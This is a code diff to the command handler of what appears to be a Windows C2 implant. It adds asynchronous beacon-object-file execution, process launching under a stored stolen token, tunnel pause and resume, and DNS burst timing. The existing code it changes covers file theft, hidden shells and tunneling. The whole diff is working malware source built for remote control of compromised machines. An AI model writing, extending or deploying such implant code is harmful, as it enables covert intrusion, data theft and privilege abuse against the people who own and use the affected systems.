@@ -1,13 +1,16 @@
 #include "Commander.h"
+#include "bof_loader.h"
 #include "Boffer.h"
 
-void* Commander::operator new(size_t sz)
+extern HANDLE g_StoredToken;
+
+void* Commander::operator new(size_t sz) 
 {
 	void* p = MemAllocLocal(sz);
 	return p;
 }
 
-void Commander::operator delete(void* p) noexcept
+void Commander::operator delete(void* p) noexcept 
 {
 	MemFreeLocal(&p, sizeof(Commander));
 }
@@ -30,7 +33,7 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		return;
 	}
 
-	while ( packerSize + 4 > inPacker->datasize())
+	while ( inPacker->datasize() < packerSize + 4 )
 	{	
 		ULONG CommandId = inPacker->Unpack32();
 		switch ( CommandId )
@@ -122,6 +125,12 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		case COMMAND_TUNNEL_WRITE_UDP:
 			this->CmdTunnelMsgWriteUDP(CommandId, inPacker, outPacker); break;
 
+		case COMMAND_TUNNEL_PAUSE: 
+			this->CmdTunnelMsgPause(CommandId, inPacker, outPacker); break;
+		
+		case COMMAND_TUNNEL_RESUME: 
+			this->CmdTunnelMsgResume(CommandId, inPacker, outPacker); break;
+
 		case COMMAND_TUNNEL_CLOSE:
 			this->CmdTunnelMsgClose(CommandId, inPacker, outPacker); break;
 
@@ -153,14 +162,9 @@ void Commander::CmdCat(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	outPacker->Pack32(taskId);
 
 	HANDLE hFile = ApiWin->CreateFileA(path, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
-	if ((!hFile) || (hFile == INVALID_HANDLE_VALUE)) {
+	if ( !hFile || hFile == INVALID_HANDLE_VALUE ) {
 		outPacker->Pack32(COMMAND_ERROR);
 		outPacker->Pack32(TEB->LastErrorValue);
-
-		if (hFile) {
-			ApiNt->NtClose(hFile);
-			hFile = NULL;
-		}
 		return;
 	}
 
@@ -279,14 +283,16 @@ void Commander::CmdDownload(ULONG commandId, Packer* inPacker, Packer* outPacker
 	else {
 		CHAR  fullPath[MAX_PATH];
 		DWORD pathSize = ApiWin->GetFullPathNameA( filename, MAX_PATH, fullPath, NULL);
-		DWORD fileSize = ApiWin->GetFileSize( hFile, 0 );
+		DWORD fileSizeHigh = 0;
+		DWORD fileSizeLow  = ApiWin->GetFileSize( hFile, &fileSizeHigh );
+		ULONG64 fileSize   = ((ULONG64)fileSizeHigh << 32) | fileSizeLow;
 
 		if (pathSize > 0) {
 			DownloadData downloadData = this->agent->downloader->CreateDownloadData(taskId, hFile, fileSize);
 			outPacker->Pack32(COMMAND_DOWNLOAD);
 			outPacker->Pack32(downloadData.fileId);
 			outPacker->Pack8(DOWNLOAD_START);
-			outPacker->Pack32(downloadData.fileSize);
+			outPacker->Pack64(downloadData.fileSize);
 			outPacker->PackBytes((PBYTE)fullPath, pathSize);
 		}
 		else {
@@ -325,6 +331,7 @@ void Commander::CmdDownloadState(ULONG commandId, Packer* inPacker, Packer* outP
 
 void Commander::CmdExecBof(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
+	BOOL  async     = inPacker->Unpack8();
 	ULONG entrySize = 0;
 	BYTE* entry     = inPacker->UnpackBytes(&entrySize);
 	ULONG bofSize   = 0;
@@ -333,14 +340,38 @@ void Commander::CmdExecBof(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	BYTE* args      = inPacker->UnpackBytes(&argsSize);
 	ULONG taskId    = inPacker->Unpack32();
 
-	Packer* bofPacker = ObjectExecute(taskId, (CHAR*)entry, bof, bofSize, args, argsSize);
-	if (bofPacker->datasize() > 8)
-		outPacker->PackFlatBytes(bofPacker->data(), bofPacker->datasize());
+	if (!g_AsyncBofManager) {
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(COMMAND_ERROR);
+		outPacker->Pack32(ERROR_NOT_SUPPORTED);
+		return;
+	}
 
-	outPacker->Pack32(taskId);
-	outPacker->Pack32(commandId);
+	if (async) {
+		AsyncBofContext* ctx = g_AsyncBofManager->CreateAsyncBof(taskId, (CHAR*)entry, bof, bofSize, args, argsSize);
+		if (!ctx) {
+			outPacker->Pack32(COMMAND_ERROR);
+			outPacker->Pack32(ERROR_NOT_ENOUGH_MEMORY);
+			return;
+		}
+		if (!g_AsyncBofManager->StartAsyncBof(ctx)) {
+			outPacker->Pack32(COMMAND_ERROR);
+			outPacker->Pack32(TEB->LastErrorValue);
+			return;
+		}
+	}
+	else {
+		Packer* bofPacker = ObjectExecute(taskId, (CHAR*)entry, bof, bofSize, args, argsSize);
+		if (bofPacker && bofPacker->datasize() > 0)
+			outPacker->PackFlatBytes(bofPacker->data(), bofPacker->datasize());
 
-	bofPacker->Clear(TRUE);
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(commandId);
+		outPacker->Pack8(FALSE);
+
+		if (bofPacker)
+			bofPacker->Clear(TRUE);
+	}
 }
 
 void Commander::CmdGetUid(ULONG commandId, Packer* inPacker, Packer* outPacker)
@@ -348,7 +379,6 @@ void Commander::CmdGetUid(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	ULONG taskId = inPacker->Unpack32();
 
 	outPacker->Pack32(taskId);
-	outPacker->Pack32(commandId);
 
 	BOOL  result       = FALSE;
 	BOOL  elevated     = FALSE;
@@ -362,6 +392,7 @@ void Commander::CmdGetUid(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		result = TokenToUser(TokenHandle, username, &usernameSize, domain, &domainSize, &elevated);
 
 	if (result) {
+		outPacker->Pack32(commandId);
 		outPacker->Pack8(elevated);
 		outPacker->PackStringA(domain);
 		outPacker->PackStringA(username);
@@ -370,6 +401,9 @@ void Commander::CmdGetUid(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		outPacker->Pack32(COMMAND_ERROR);
 		outPacker->Pack32(TEB->LastErrorValue);
 	}
+
+	if (TokenHandle)
+		ApiNt->NtClose(TokenHandle);
 
 	MemFreeLocal( (LPVOID*)&username, 512);
 	MemFreeLocal( (LPVOID*)&domain, 512);
@@ -383,8 +417,15 @@ void Commander::CmdJobsList(ULONG commandId, Packer* inPacker, Packer* outPacker
 	outPacker->Pack32(commandId);
 
 	ULONG count = agent->jober->jobs.size();
+	ULONG asyncBofCount = 0;
+	
+	if (g_AsyncBofManager)
+		ApiWin->EnterCriticalSection(&g_AsyncBofManager->managerLock);
+	
+	if (g_AsyncBofManager)
+		asyncBofCount = g_AsyncBofManager->asyncBofs.size();
 
-	outPacker->Pack32(count);
+	outPacker->Pack32(count + asyncBofCount);
 
 	for (int i = 0; i < count; i++) {
 		ULONG jobId  = agent->jober->jobs[i].jobId;
@@ -394,6 +435,16 @@ void Commander::CmdJobsList(ULONG commandId, Packer* inPacker, Packer* outPacker
 		outPacker->Pack32(jobId);
 		outPacker->Pack16(jobType);
 		outPacker->Pack16(pid);
+	}
+
+	if (g_AsyncBofManager) {
+		for (size_t i = 0; i < asyncBofCount; i++) {
+			AsyncBofContext* ctx = g_AsyncBofManager->asyncBofs[i];
+			outPacker->Pack32(ctx->taskId);
+			outPacker->Pack16(JOB_TYPE_ASYNCBOF);
+			outPacker->Pack16(0);
+		}
+		ApiWin->LeaveCriticalSection(&g_AsyncBofManager->managerLock);
 	}
 }
 
@@ -415,6 +466,9 @@ void Commander::CmdJobsKill(ULONG commandId, Packer* inPacker, Packer* outPacker
 		}
 	}
 
+	if (!found && g_AsyncBofManager)
+		found = g_AsyncBofManager->StopAsyncBof(jobId);
+
 	outPacker->Pack8(found);
 	outPacker->Pack32(jobId);
 }
@@ -422,9 +476,6 @@ void Commander::CmdJobsKill(ULONG commandId, Packer* inPacker, Packer* outPacker
 void Commander::CmdLink(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	ULONG pivotType = inPacker->Unpack32();
-
-	DWORD BytesSize = 0;
-	PVOID Output = NULL;
 
 	if (pivotType == PIVOT_TYPE_SMB) {
 		ULONG pipeSize = 0;
@@ -469,9 +520,13 @@ void Commander::CmdLs(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		}
 	}
 
-	fullpath[fullpathSize]   = '\\';
-	fullpath[++fullpathSize] = '*';
-	fullpath[++fullpathSize] = 0;
+	DWORD fileAttribs = ApiWin->GetFileAttributesA(fullpath);
+	BOOL isFile = (fileAttribs != INVALID_FILE_ATTRIBUTES) && !(fileAttribs & FILE_ATTRIBUTE_DIRECTORY);
+	if (!isFile) {
+		fullpath[fullpathSize] = '\\';
+		fullpath[++fullpathSize] = '*';
+		fullpath[++fullpathSize] = 0;
+	}
 
 	WIN32_FIND_DATAA findData = { 0 };
 	HANDLE File = ApiWin->FindFirstFileA(fullpath, &findData);
@@ -504,7 +559,7 @@ void Commander::CmdLs(ULONG commandId, Packer* inPacker, Packer* outPacker)
 
 			count++;
 
-		} while (ApiWin->FindNextFileA(File, &findData));
+		} while (!isFile && ApiWin->FindNextFileA(File, &findData));
 		ApiWin->FindClose(File);
 		outPacker->Set32(indexCount, count);
 	}
@@ -615,6 +670,35 @@ void Commander::CmdProfile(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		outPacker->Pack32(subcommand);
 		outPacker->Pack32(agent->config->working_time);
 	}
+#if defined(BEACON_DNS)
+	else if (subcommand == 5) { // burst set
+		ULONG burstEnabled = inPacker->Unpack32();
+		ULONG burstSleep   = inPacker->Unpack32();
+		ULONG burstJitter  = inPacker->Unpack32();
+		ULONG taskId       = inPacker->Unpack32();
+
+		agent->config->profile.burst_enabled = burstEnabled;
+		agent->config->profile.burst_sleep   = burstSleep;
+		agent->config->profile.burst_jitter  = burstJitter;
+
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(COMMAND_PROFILE);
+		outPacker->Pack32(subcommand);
+		outPacker->Pack32(agent->config->profile.burst_enabled);
+		outPacker->Pack32(agent->config->profile.burst_sleep);
+		outPacker->Pack32(agent->config->profile.burst_jitter);
+	}
+	else if (subcommand == 6) { // burst show
+		ULONG taskId = inPacker->Unpack32();
+
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(COMMAND_PROFILE);
+		outPacker->Pack32(subcommand);
+		outPacker->Pack32(agent->config->profile.burst_enabled);
+		outPacker->Pack32(agent->config->profile.burst_sleep);
+		outPacker->Pack32(agent->config->profile.burst_jitter);
+	}
+#endif
 }
 
 void Commander::CmdPsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
@@ -681,8 +765,8 @@ void Commander::CmdPsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
 
 				ConvertUnicodeStringToChar(spi->ImageName.Buffer, spi->ImageName.Length, processName, sizeof(processName));
 
-				outPacker->Pack16((WORD)spi->UniqueProcessId);
-				outPacker->Pack16((WORD)spi->InheritedFromUniqueProcessId);
+				outPacker->Pack16((WORD)(ULONG_PTR)spi->UniqueProcessId);
+				outPacker->Pack16((WORD)(ULONG_PTR)spi->InheritedFromUniqueProcessId);
 				outPacker->Pack16((WORD)spi->SessionId);
 				outPacker->Pack8(arch64);
 				outPacker->Pack8(elevated);
@@ -766,6 +850,7 @@ void Commander::CmdPsKill(ULONG commandId, Packer* inPacker, Packer* outPacker)
 void Commander::CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	BOOL  progOutput   = inPacker->Unpack8();
+	BOOL  useToken     = inPacker->Unpack8();
 	BOOL  progState    = inPacker->Unpack32();
 	ULONG progArgsSize = 0;
 	CHAR* progArgs     = (CHAR*)inPacker->UnpackBytes(&progArgsSize);
@@ -782,13 +867,39 @@ void Commander::CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	if (progOutput) {
 		SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
 		ApiWin->CreatePipe(&pipeRead, &pipeWrite, &sa, 0);
-
+		
 		spi.hStdError  = pipeWrite;
 		spi.hStdOutput = pipeWrite;
 		spi.hStdInput  = NULL;
 	}
 
-	BOOL result = ApiWin->CreateProcessA(NULL, progArgs, NULL, NULL, TRUE, progState | CREATE_NO_WINDOW, NULL, NULL, &spi, &pi);
+	BOOL result = FALSE;
+
+	if (useToken && g_StoredToken) {
+		result = ApiWin->CreateProcessAsUserA(g_StoredToken, NULL, progArgs, NULL, NULL, TRUE, progState | CREATE_NO_WINDOW, NULL, NULL, &spi, &pi);
+		if (!result && ApiWin->CreateProcessWithTokenW) {
+			STARTUPINFOW spiW = { 0 };
+			spiW.cb = sizeof(STARTUPINFOW);
+			spiW.dwFlags = spi.dwFlags;
+			spiW.wShowWindow = spi.wShowWindow;
+			spiW.hStdError = spi.hStdError;
+			spiW.hStdOutput = spi.hStdOutput;
+			spiW.hStdInput = spi.hStdInput;
+
+			int wLen = ApiWin->MultiByteToWideChar(CP_ACP, 0, progArgs, -1, NULL, 0);
+			if (wLen > 0) {
+				WCHAR* wArgs = (WCHAR*)MemAllocLocal(wLen * sizeof(WCHAR));
+				if (wArgs) {
+					ApiWin->MultiByteToWideChar(CP_ACP, 0, progArgs, -1, wArgs, wLen);
+					result = ApiWin->CreateProcessWithTokenW(g_StoredToken, LOGON_WITH_PROFILE, NULL, wArgs, progState | CREATE_NO_WINDOW, NULL, NULL, &spiW, &pi);
+					MemFreeLocal((LPVOID*)&wArgs, wLen * sizeof(WCHAR));
+				}
+			}
+		}
+	}
+	else
+		result = ApiWin->CreateProcessA(NULL, progArgs, NULL, NULL, TRUE, progState | CREATE_NO_WINDOW, NULL, NULL, &spi, &pi);
+
 	if (result) {
 		JobData job = agent->jober->CreateJobData(taskId, JOB_TYPE_PROCESS, JOB_STATE_RUNNING, pi.hProcess, pi.dwProcessId, pipeRead, pipeWrite);
 
@@ -890,10 +1001,10 @@ void Commander::CmdShellStart(ULONG commandId, Packer* inPacker, Packer* outPack
 
 	HANDLE beaconOutPipe = ApiWin->CreateNamedPipeA(pipeName, PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 0x4000, 0x4000, 0, &sa);
 	HANDLE shellOutPipe  = ApiWin->CreateFileA(pipeName, FILE_WRITE_DATA | SYNCHRONIZE, 0, &sa, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
-
+	
 	r1 = GenerateRandom32();
 	ApiWin->snprintf(pipeName, 18, "\\\\.\\pipe\\%08lx", r1);
-
+	
 	HANDLE beaconInPipe = ApiWin->CreateNamedPipeA(pipeName, PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 0x4000, 0x4000, 0, &sa);
 	HANDLE shellInPipe  = ApiWin->CreateFileA(pipeName, FILE_READ_DATA | SYNCHRONIZE, 0, &sa, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
 
@@ -936,7 +1047,7 @@ void Commander::CmdShellStart(ULONG commandId, Packer* inPacker, Packer* outPack
 	}
 }
 
-void Commander::CmdShellWrite(ULONG commandId, Packer* inPacker, Packer* outPacker)
+void Commander::CmdShellWrite(ULONG commandId, Packer* inPacker, Packer* outPacker) 
 {
 	ULONG jobId = inPacker->Unpack32();
 	ULONG dataSize = 0;
@@ -956,7 +1067,7 @@ void Commander::CmdTerminate(ULONG commandId, Packer* inPacker, Packer* outPacke
 {
 	agent->config->exit_method  = inPacker->Unpack32();
 	agent->config->exit_task_id = inPacker->Unpack32();
-	agent->SetActive(FALSE);
+	agent->Active = FALSE;
 }
 
 void Commander::CmdTunnelMsgConnectTCP(ULONG commandId, Packer* inPacker, Packer* outPacker) 
@@ -989,7 +1100,7 @@ void Commander::CmdTunnelMsgWriteTCP(ULONG commandId, Packer* inPacker, Packer* 
 	CHAR* data      = (CHAR*)inPacker->UnpackBytes(&dataSize);
 	ULONG taskId	= inPacker->Unpack32();
 
-	this->agent->proxyfire->ConnectWriteTCP(channelId, data, dataSize);
+	this->agent->proxyfire->ConnectWriteTCP(channelId, data, dataSize, outPacker);
 }
 
 void Commander::CmdTunnelMsgWriteUDP(ULONG commandId, Packer* inPacker, Packer* outPacker)
@@ -1000,6 +1111,18 @@ void Commander::CmdTunnelMsgWriteUDP(ULONG commandId, Packer* inPacker, Packer* 
 	ULONG taskId = inPacker->Unpack32();
 
 	this->agent->proxyfire->ConnectWriteUDP(channelId, data, dataSize);
+}
+
+void Commander::CmdTunnelMsgPause(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG channelId = inPacker->Unpack32();
+	this->agent->proxyfire->ConnectPause(channelId);
+}
+
+void Commander::CmdTunnelMsgResume(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG channelId = inPacker->Unpack32();
+	this->agent->proxyfire->ConnectResume(channelId);
 }
 
 void Commander::CmdTunnelMsgClose(ULONG commandId, Packer* inPacker, Packer* outPacker)
